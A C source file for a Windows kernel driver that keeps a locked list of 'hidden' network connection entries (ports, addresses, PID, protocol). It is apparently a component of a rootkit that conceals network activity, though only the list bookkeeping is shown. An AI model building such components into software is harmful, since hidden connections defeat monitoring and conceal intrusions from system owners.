#include "..\..\includes\shared.h"
#include "..\..\includes\net_defs.h"

LIST_ENTRY g_net_list;
KSPIN_LOCK g_net_lock;

void net_init(void)
{
    InitializeListHead(&g_net_list);
    KeInitializeSpinLock(&g_net_lock);
}

void net_cleanup(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_net_entry ne;

    KeAcquireSpinLock(&g_net_lock, &irql);
    while (!IsListEmpty(&g_net_list)) {
        entry = RemoveHeadList(&g_net_list);
        ne = CONTAINING_RECORD(entry, hidden_net_entry, list);
        ExFreePool(ne);
    }
    KeReleaseSpinLock(&g_net_lock, irql);
}

NTSTATUS net_add(pnet_request req)
{
    phidden_net_entry ne;
    KIRQL irql;

    ne = (phidden_net_entry)ExAllocatePoolWithTag(NonPagedPool, sizeof(hidden_net_entry), 'ntch');
    if (!ne) return STATUS_INSUFFICIENT_RESOURCES;
    ne->local_port = req->local_port;
    ne->remote_port = req->remote_port;
    ne->local_addr = req->local_addr;
    ne->remote_addr = req->remote_addr;
    ne->pid = req->pid;
    ne->protocol = req->protocol;
    InitializeListHead(&ne->list);
    KeAcquireSpinLock(&g_net_lock, &irql);
    InsertTailList(&g_net_list, &ne->list);
    KeReleaseSpinLock(&g_net_lock, irql);
    return STATUS_SUCCESS;
}

NTSTATUS net_remove(pnet_request req)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_net_entry ne;

    KeAcquireSpinLock(&g_net_lock, &irql);
    for (entry = g_net_list.Flink; entry != &g_net_list; entry = entry->Flink) {
        ne = CONTAINING_RECORD(entry, hidden_net_entry, list);
        if (ne->local_port == req->local_port && ne->remote_port == req->remote_port &&
            ne->local_addr == req->local_addr && ne->remote_addr == req->remote_addr &&
            ne->pid == req->pid && ne->protocol == req->protocol) {
            RemoveEntryList(&ne->list);
            KeReleaseSpinLock(&g_net_lock, irql);
            ExFreePool(ne);
            return STATUS_SUCCESS;
        }
    }
    KeReleaseSpinLock(&g_net_lock, irql);
    return STATUS_NOT_FOUND;
}

ULONG net_count(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    ULONG count = 0;

    KeAcquireSpinLock(&g_net_lock, &irql);
    for (entry = g_net_list.Flink; entry != &g_net_list; entry = entry->Flink)
        count++;
    KeReleaseSpinLock(&g_net_lock, irql);
    return count;
}

NTSTATUS net_list(PVOID buffer, ULONG size, PULONG needed)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_net_entry ne;
    pnet_request nr = (pnet_request)buffer;
    ULONG count = 0;

    *needed = net_count() * sizeof(net_request);
    if (size < *needed) return STATUS_BUFFER_TOO_SMALL;
    KeAcquireSpinLock(&g_net_lock, &irql);
    for (entry = g_net_list.Flink; entry != &g_net_list; entry = entry->Flink) {
        ne = CONTAINING_RECORD(entry, hidden_net_entry, list);
        nr[count].local_port = ne->local_port;
        nr[count].remote_port = ne->remote_port;
        nr[count].local_addr = ne->local_addr;
        nr[count].remote_addr = ne->remote_addr;
        nr[count].pid = ne->pid;
        nr[count].protocol = ne->protocol;
        count++;
    }
    KeReleaseSpinLock(&g_net_lock, irql);
    return STATUS_SUCCESS;
}
